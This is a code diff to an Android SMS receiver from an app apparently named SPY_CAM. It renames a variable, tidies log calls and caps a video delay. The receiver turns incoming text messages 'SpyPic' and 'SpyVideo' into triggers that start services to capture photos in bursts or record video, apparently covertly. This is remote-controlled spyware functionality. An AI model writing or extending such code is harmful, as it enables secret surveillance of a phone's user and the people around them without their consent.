@@ -26,11 +26,11 @@ public class SmsReceiver extends BroadcastReceiver {
                         msg_from = msgs[i].getOriginatingAddress();
                         msgBody = msgs[i].getMessageBody();
                         String intValue = msgBody.replaceAll("[^0-9]", "");
-                        Log.i("SPY_CAM" , "INT :" + intValue);
+                        Log.i("SPY_CAM", "INT :" + intValue);
                         System.out.println(intValue);
-                        String getMsg = msgBody.replaceAll("[0-9]","");
-                        Log.i("SPY_CAM" , "Msg :" + getMsg);
-                        if (getMsg.equals("SpyPic")) {
+                        String originalMsg = msgBody.replaceAll("[0-9]","");
+                        Log.i("SPY_CAM" , "Msg :" + originalMsg);
+                        if (originalMsg.equals("SpyPic")) {
                             Log.i("SPY_CAM", "Capturing Image");
                             Intent picServiceIntent = new Intent(context, SpyPictureService.class);
                             if (!intValue.isEmpty()) {
@@ -41,13 +41,15 @@ public class SmsReceiver extends BroadcastReceiver {
                                 picServiceIntent.putExtra("burstValue", firstValue);
                             }
                             context.startService(picServiceIntent);
-                        } else if (getMsg.equals("SpyVideo")) {
+                        } else if (originalMsg.equals("SpyVideo")) {
                             Log.i("SPY_CAM", "Capturing Video");
                             Intent videoIntent = new Intent(context, SpyVideoService.class);
                             if (!intValue.isEmpty()) {
                                 int videoDelay = Integer.parseInt(intValue);
-                                Log.i("SPY_CAM" , "videoDuration" + videoDelay);
-                                videoIntent.putExtra("videoDelay" , videoDelay);
+                                Log.i("SPY_CAM", "videoDuration" + videoDelay);
+                                if (videoDelay < 60) {
+                                    videoIntent.putExtra("videoDelay", videoDelay);
+                                }
                             }
                             context.startService(videoIntent);
                         }
